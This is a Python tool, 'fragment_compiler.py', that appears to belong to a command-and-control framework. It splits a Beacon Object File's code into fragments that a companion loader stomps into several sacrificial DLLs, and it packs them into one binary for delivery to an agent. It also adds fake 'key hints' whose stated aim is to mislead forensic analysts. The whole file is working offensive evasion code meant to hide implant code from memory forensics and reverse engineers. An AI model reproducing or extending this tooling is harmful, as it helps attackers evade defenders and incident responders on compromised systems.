#!/usr/bin/env python3
"""
fragment_compiler.py - BOF Fragmentation Engine (Layer A)

NOVEL TECHNIQUE: Splits a BOF's .text section into N fragments,
each fragment meant to be loaded into a DIFFERENT sacrificial DLL.

This means:
  - Memory dump shows BOF code scattered across 3+ DLLs
  - No single DLL contains the complete BOF
  - Reverse engineer must collect pieces from multiple modules
  - Each fragment uses different encryption key

The loader (fragment_loader.c) re-assembles execution flow
by stomping each fragment into a different DLL and chaining
execution via callbacks.

Fragment Format:
  [4B magic "FRG1"][4B total_fragments][4B fragment_idx]
  [4B fragment_size][4B original_offset]
  [N bytes: fragment code]
  [16B next_fragment_key_hint (unused but adds confusion)]

Total overhead: 24 bytes per fragment
"""

import os
import sys
import struct
import hashlib
import shutil
import subprocess
import tempfile
import random


# ============================================================
#  Constants
# ============================================================
FRAGMENT_MAGIC = b"FRG1"
FRAGMENT_HEADER_SIZE = 24  # magic + total + idx + size + offset + key_hint
DEFAULT_NUM_FRAGMENTS = 3


# ============================================================
#  BOF .text section parser
# ============================================================
def parse_coff_text_section(coff_path):
    """Parse a COFF .o file and extract the .text section.

    Returns:
      (text_data, text_offset_in_file, text_size, full_coff_data)
    """
    import struct

    with open(coff_path, 'rb') as f:
        data = f.read()

    if len(data) < 20:
        raise ValueError("File too small to be COFF")

    # COFF header: 20 bytes
    machine, num_sections, _, ptr_symtab, num_syms, sz_opt, _ = \
        struct.unpack_from('<HHIIIHH', data, 0)

    if machine != 0x8664:
        raise ValueError("Not an AMD64 COFF")

    # Find .text section
    text_data = None
    text_offset = 0
    text_size = 0

    sec_hdr_start = 20 + sz_opt
    for i in range(num_sections):
        off = sec_hdr_start + i * 40
        name_bytes = data[off:off+8]
        name = name_bytes.split(b'\x00')[0].decode('utf-8', errors='replace')

        vsize, vaddr, raw_size, raw_ptr, ptr_relocs, ptr_lines, \
            num_relocs, num_lines, char = struct.unpack_from('<IIIIIIHHI', data, off+8)

        if name == '.text':
            text_data = data[raw_ptr:raw_ptr + raw_size]
            text_offset = raw_ptr
            text_size = raw_size
            break

    if text_data is None:
        raise ValueError("No .text section found")

    return text_data, text_offset, text_size, data


# ============================================================
#  Safe split points finder
# ============================================================
def find_safe_split_points(text_data, num_fragments):
    """Find safe points to split .text code.

    "Safe" means: split AFTER a `ret` instruction (0xC3) or
    after a `jmp` instruction (0xE9 + 4 bytes offset).

    This ensures each fragment ends at a function boundary,
    so execution can pause/resume cleanly.

    Returns list of split offsets (num_fragments - 1 offsets).
    """
    # Find all `ret` (0xC3) and `jmp rel32` (0xE9) positions
    safe_points = []
    i = 0
    while i < len(text_data):
        if text_data[i] == 0xC3:  # ret
            safe_points.append(i + 1)  # split AFTER ret
            i += 1
        elif text_data[i] == 0xE9 and i + 5 <= len(text_data):  # jmp rel32
            safe_points.append(i + 5)  # split AFTER jmp
            i += 5
        else:
            i += 1

    if len(safe_points) < num_fragments - 1:
        # Not enough safe points, use even splits
        chunk_size = len(text_data) // num_fragments
        return [chunk_size * (i + 1) for i in range(num_fragments - 1)]

    # Pick evenly distributed safe points
    target_indices = [
        int(len(safe_points) * (i + 1) / num_fragments)
        for i in range(num_fragments - 1)
    ]
    target_indices = [min(i, len(safe_points) - 1) for i in target_indices]

    return [safe_points[i] for i in target_indices]


# ============================================================
#  Fragment BOF into N pieces
# ============================================================
def fragment_bof(bof_o_path, output_dir, num_fragments=DEFAULT_NUM_FRAGMENTS,
                  verbose=False):
    """Split a BOF .o file into N fragments.

    Each fragment is saved as:
      <output_dir>/frag_0.bin
      <output_dir>/frag_1.bin
      <output_dir>/frag_2.bin
      ...

    A manifest file is also created:
      <output_dir>/manifest.json

    Args:
      bof_o_path: Path to input .o file
      output_dir: Directory to write fragments
      num_fragments: Number of fragments to create
      verbose: Print details

    Returns:
      Dict with fragment info
    """
    if verbose:
        print(f"[*] Fragmenting: {bof_o_path}")
        print(f"    Target fragments: {num_fragments}")

    # Parse .text section
    text_data, text_offset, text_size, full_coff = parse_coff_text_section(bof_o_path)

    if verbose:
        print(f"[*] .text section: {text_size} bytes (offset 0x{text_offset:X})")

    if text_size < num_fragments * 50:
        print(f"[!] .text too small for {num_fragments} fragments")
        num_fragments = max(2, text_size // 50)

    # Find safe split points
    split_points = find_safe_split_points(text_data, num_fragments)
    split_points = [0] + split_points + [text_size]

    if verbose:
        print(f"[*] Split points: {[hex(p) for p in split_points]}")

    # Create fragments
    os.makedirs(output_dir, exist_ok=True)

    fragments = []
    for i in range(num_fragments):
        start = split_points[i]
        end = split_points[i + 1]
        frag_code = text_data[start:end]
        frag_size = len(frag_code)

        # Generate random "key hint" (16 bytes, not actually used for crypto
        # but adds forensic confusion — analyst thinks each fragment is encrypted)
        key_hint = bytes([random.randint(0, 255) for _ in range(16)])

        # Build fragment binary
        # Header format: magic(4s) + total(I) + idx(I) + frag_size(I) + orig_offset(I)
        header = struct.pack('<4sIIII',
                              FRAGMENT_MAGIC,
                              num_fragments,
                              i,
                              frag_size,
                              start)
        header += key_hint                               # 16 bytes key hint

        frag_binary = header + frag_code

        frag_path = os.path.join(output_dir, f"frag_{i}.bin")
        with open(frag_path, 'wb') as f:
            f.write(frag_binary)

        fragments.append({
            'index': i,
            'path': frag_path,
            'size': frag_size,
            'original_offset': start,
            'header_size': FRAGMENT_HEADER_SIZE,
        })

        if verbose:
            print(f"[*] Fragment {i}: {frag_size} bytes "
                  f"(orig offset 0x{start:X})")

    # Create manifest
    manifest = {
        'source': os.path.basename(bof_o_path),
        'total_fragments': num_fragments,
        'text_size': text_size,
        'fragments': fragments,
    }

    manifest_path = os.path.join(output_dir, 'manifest.json')
    import json
    with open(manifest_path, 'w') as f:
        json.dump(manifest, f, indent=2)

    if verbose:
        print(f"\n[+] Fragmentation complete:")
        print(f"    Output dir: {output_dir}")
        print(f"    Fragments: {num_fragments}")
        print(f"    Manifest: {manifest_path}")

    return manifest


# ============================================================
#  Pack fragments into single binary (for delivery)
# ============================================================
def pack_fragments(output_bin_path, fragments_dir, verbose=False):
    """Pack all fragments into a single binary for delivery.

    Format:
      [4B magic "FBND"][4B num_fragments]
      For each fragment:
        [4B frag_size][N bytes frag_data]
      [4B manifest_size][N bytes manifest_json]

    This single binary is what the server sends to the agent.
    The agent's fragment_loader.c unpacks and processes it.
    """
    import json

    # Read manifest
    manifest_path = os.path.join(fragments_dir, 'manifest.json')
    with open(manifest_path) as f:
        manifest = json.load(f)

    num_fragments = manifest['total_fragments']

    # Build packed binary
    packed = b"FBND"  # magic
    packed += struct.pack('<I', num_fragments)

    for i in range(num_fragments):
        frag_path = os.path.join(fragments_dir, f'frag_{i}.bin')
        with open(frag_path, 'rb') as f:
            frag_data = f.read()
        packed += struct.pack('<I', len(frag_data))
        packed += frag_data

    # Append manifest as JSON
    manifest_json = json.dumps(manifest).encode()
    packed += struct.pack('<I', len(manifest_json))
    packed += manifest_json

    with open(output_bin_path, 'wb') as f:
        f.write(packed)

    if verbose:
        print(f"[*] Packed {num_fragments} fragments → {output_bin_path}")
        print(f"    Total size: {len(packed)} bytes")

    return len(packed)


# ============================================================
#  Main: fragment a BOF
# ============================================================
def main():
    import argparse

    p = argparse.ArgumentParser(description='BOF Fragmentation Engine')
    p.add_argument('bof_path', help='Path to BOF .o file')
    p.add_argument('-o', '--output', default='./fragments',
                   help='Output directory (default: ./fragments)')
    p.add_argument('-n', '--num', type=int, default=DEFAULT_NUM_FRAGMENTS,
                   help=f'Number of fragments (default: {DEFAULT_NUM_FRAGMENTS})')
    p.add_argument('-p', '--pack', action='store_true',
                   help='Also pack fragments into single .bin file')
    p.add_argument('-v', '--verbose', action='store_true')
    args = p.parse_args()

    manifest = fragment_bof(args.bof_path, args.output,
                             num_fragments=args.num, verbose=args.verbose)

    if args.pack:
        packed_path = os.path.join(args.output, 'packed.bin')
        pack_fragments(packed_path, args.output, verbose=args.verbose)


if __name__ == '__main__':
    main()
